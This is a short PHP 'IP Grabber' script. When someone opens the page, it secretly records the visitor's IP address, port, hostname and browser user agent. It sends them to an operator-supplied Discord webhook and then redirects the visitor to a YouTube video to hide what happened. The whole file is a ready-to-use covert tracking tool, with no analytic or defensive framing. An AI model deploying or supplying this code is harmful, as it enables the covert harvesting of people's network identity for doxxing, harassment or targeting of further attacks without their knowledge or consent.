<?php
 
//IP Grabber

//Changeables Variables

$redirect = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; #URL of redirection
$url = ""; #Discord Webhook URL

//Fix Variables 
$date = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$port = $_SERVER['REMOTE_PORT'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$line = $date . "\n" . $ip . "\n" . $port . "\n" . $hostname . "\n" . $agent . "\n---------------------------";
$headers = ['Content-Type: application/json; charset=utf-8'];
$POST = ["content"=> $line];
 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response   = curl_exec($ch);

echo '<script>window.location.replace("'. $redirect .'");</script>'

?>